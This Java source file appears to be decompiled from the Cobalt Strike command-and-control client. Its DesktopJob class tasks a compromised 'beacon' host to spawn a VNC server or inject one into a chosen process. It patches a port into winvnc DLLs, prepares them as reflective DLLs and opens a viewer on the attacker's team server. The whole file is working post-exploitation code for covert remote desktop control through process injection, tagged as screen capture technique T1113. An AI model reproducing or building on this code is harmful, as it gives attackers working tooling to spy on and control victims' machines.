package beacon.jobs;

import aggressor.DataUtils;
import aggressor.Prefs;
import beacon.CommandBuilder;
import beacon.TaskBeacon;
import com.glavsoft.viewer.Viewer;
import common.BeaconEntry;
import common.Callback;
import common.CommonUtils;
import common.ReflectiveDLL;

public class DesktopJob implements Callback {
    protected TaskBeacon tasker;
    protected CommandBuilder builder;
    protected String bid;
    protected int vport;
    protected int pid;
    protected boolean quality;
    protected boolean is64;
    protected boolean isInject;

    public DesktopJob(final TaskBeacon tasker) {
        this.builder = new CommandBuilder();
        this.is64 = false;
        this.isInject = false;
        this.tasker = tasker;
    }

    public String getTactic() {
        return "T1113";
    }

    protected void StartViewer(final String bid, final int vport, final boolean quality) {
        final String vhost = DataUtils.getTeamServerIP(this.tasker.getClient().getData());
        final BeaconEntry entry = DataUtils.getBeacon(this.tasker.getClient().getData(), bid);
        final String myip = entry.getInternal();
        new Viewer(vhost, vport, quality, viewer -> DesktopJob.this.tasker.getClient().getTabManager().addTab("Desktop " + myip, viewer, ev -> {
            DesktopJob.this.tasker.getClient().getConnection().call("beacons.pivot_stop_port", CommonUtils.args(vport));
            new Thread(viewer::closeApp, "VNC Viewer Cleanup").start();
        }, "VNC client"));
    }

    public void inject(final String bid, final int pid, final String arch, final boolean quality) {
        this.bid = bid;
        this.quality = quality;
        this.isInject = true;
        this.pid = pid;
        this.is64 = "x64".equals(arch);
        this.vport = Prefs.getPreferences().getRandomPort("client.vncports.string", "5000-9999");
        final BeaconEntry entry = DataUtils.getBeacon(this.tasker.getClient().getData(), bid);
        if (entry == null) {
            this.tasker.error("Could not find Beacon entry (wait for it to checkin)");
            return;
        }
        if (this.is64) {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x64.dll"), this);
        } else {
            this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
        }
    }

    public void spawn(final String bid, final boolean quality) {
        this.bid = bid;
        this.quality = quality;
        final BeaconEntry entry = DataUtils.getBeacon(this.tasker.getClient().getData(), bid);
        if (entry == null) {
            this.tasker.error("Could not find Beacon entry (wait for it to checkin)");
            return;
        }
        this.vport = Prefs.getPreferences().getRandomPort("client.vncports.string", "5000-9999");
        this.tasker.getClient().getConnection().call("aggressor.resource", CommonUtils.args("winvnc.x86.dll"), this);
    }

    public byte[] fix(byte[] mydll) {
        final String command = CommonUtils.pad(this.vport + "", '\0', 32);
        mydll = CommonUtils.patch(mydll, "VNC AAAABBBBCCCC", command);
        return mydll;
    }

    @Override
    public void result(final String call, final Object result) {
        final byte[] resource = this.fix((byte[]) result);
        if (this.isInject) {
            byte[] stage;
            if (this.is64) {
                stage = ReflectiveDLL.patchDOSHeaderX64(resource, 170532320);
                this.builder.setCommand(46);
            } else {
                stage = ReflectiveDLL.patchDOSHeader(resource, 170532320);
                this.builder.setCommand(45);
            }
            this.builder.addShort(this.vport);
            this.builder.addInteger(this.pid);
            this.builder.addInteger(0);
            this.builder.addString(stage);
        } else {
            final byte[] stage = ReflectiveDLL.patchDOSHeader(resource);
            this.builder.setCommand(18);
            this.builder.addShort(this.vport);
            this.builder.addString(stage);
        }
        final byte[] task = this.builder.build();
        if (this.isInject) {
            final String arch = this.is64 ? "x64" : "x86";
            this.tasker.task(this.bid, task, "Tasked beacon to inject VNC server into " + this.pid + "/" + arch);
        } else {
            this.tasker.task(this.bid, task, "Tasked beacon to spawn VNC server");
        }
        this.StartViewer(this.bid, this.vport, this.quality);
    }
}
